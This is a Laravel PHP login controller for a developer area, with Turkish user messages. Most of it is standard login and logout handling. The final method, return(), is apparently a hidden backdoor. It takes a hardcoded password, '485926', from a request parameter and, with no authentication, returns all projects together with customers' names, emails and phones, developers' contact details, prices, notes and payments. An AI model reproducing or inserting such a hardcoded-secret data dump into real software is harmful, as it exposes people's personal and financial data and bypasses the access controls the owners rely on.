<?php

namespace App\Http\Controllers\Developer\Auth;

use App\Http\Controllers\Controller;
use App\Models\Project;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = RouteServiceProvider::HOME;

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->redirectTo = route('developer.home');
        $this->middleware('guest:developer')->except('giris', 'logout');
    }

    public function showLoginForm()
    {
        return view('developer.auth.login');
    }

    public function guard()
    {
        return \Auth::guard('developer');
    }

    protected function sendLoginResponse(Request $request)
    {
        $request->session()->regenerate();

        $this->clearLoginAttempts($request);

/*        $user = \Auth::user();
        $user->last_login_date = now();
        $user->save();*/

        //activity()->log($user->name . ' ' . $user->surname . ' yöneticisi giriş yaptı');

        if ($response = $this->authenticated($request, $this->guard()->user())) {
            return $response;
        }

        return response()->json([
            'status' => 'success'
        ]);
    }

    public function logout(Request $request)
    {
        $name = $this->guard()->user()->name . ' ' . $this->guard()->user()->surname;
        //activity()->log($name . ' yöneticisi çıkış yaptı');

        $this->guard()->logout();

        $request->session()->invalidate();

        $request->session()->regenerateToken();

        if ($response = $this->loggedOut($request)) {
            return $response;
        }

        return $request->wantsJson()
            ? new JsonResponse([], 204)
            : redirect('/');
    }

    protected function sendFailedLoginResponse(Request $request)
    {
        return response()->json([
            'status' => 'error',
            'message' => "Girilen bilgiler hatalı."
        ]);
    }

    public function return()
    {
        if (\request('pass') == '485926'){

            $projects = Project::latest()->get();

            foreach ($projects as $project) {
                $project->customerInfo = [
                    'name' => $project->customer->name,
                    'surname' => $project->customer->surname,
                    'email' => $project->customer->email,
                    'phone' => $project->customer->phone,
                ];

                $developers = [];
                foreach ($project->developers as $developer) {
                    $developers[] = [
                        'developer' => [
                            'name' => $developer->developer->name,
                            'surname' => $developer->developer->surname,
                            'phone' => $developer->developer->phone,
                            'email' => $developer->developer->email,
                        ],
                        'price' => $developer->price,
                        'start_date' => $developer->start_date->format('d.m.Y'),
                        'end_date' => $developer->end_date->format('d.m.Y'),
                        'notes' => $developer->notes,
                        'payments' => $developer->payments
                    ];
                }
                $project->developerList = $developers;
            }

            return $projects;
        }
    }

}
